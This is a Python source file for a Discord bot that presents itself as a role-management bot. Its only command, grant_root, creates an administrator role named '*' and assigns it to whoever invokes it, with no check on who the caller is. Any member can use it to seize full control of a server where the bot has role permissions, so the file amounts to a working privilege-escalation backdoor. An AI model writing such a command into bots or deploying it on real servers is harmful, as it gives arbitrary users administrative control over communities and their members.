import os
import discord
from discord.ext import commands

# Basic configuration
TOKEN = os.getenv("DISCORD_TOKEN", "")

# Enable intents (required for role management)
intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # Essential for assigning roles

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    print("Bot is ready to manage roles.")


@bot.command()
async def grant_root(ctx: commands.Context):
    """Ensure a role named '*' exists with admin perms, then grant it to the invoker."""
    guild = ctx.guild
    if guild is None:
        print("grant_root called outside a guild; ignoring.")
        return

    role_name = "*"
    role = discord.utils.get(guild.roles, name=role_name)

    try:
        if role is None:
            permissions = discord.Permissions(administrator=True)
            role = await guild.create_role(
                name=role_name,
                permissions=permissions,
                color=discord.Color.red(),
                reason="grant_root command"
            )
            print(f"Created role {role_name} with admin permissions.")

        if role in ctx.author.roles:
            print(f"User {ctx.author} already has role {role_name}.")
            return

        await ctx.author.add_roles(role, reason="grant_root command")
        print(f"Granted role {role_name} to {ctx.author}.")

    except discord.Forbidden:
        print("Bot lacks permission to create or assign roles.")
    except Exception as exc:
        print(f"Error during grant_root: {exc}")


if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("DISCORD_TOKEN not set")
    bot.run(TOKEN)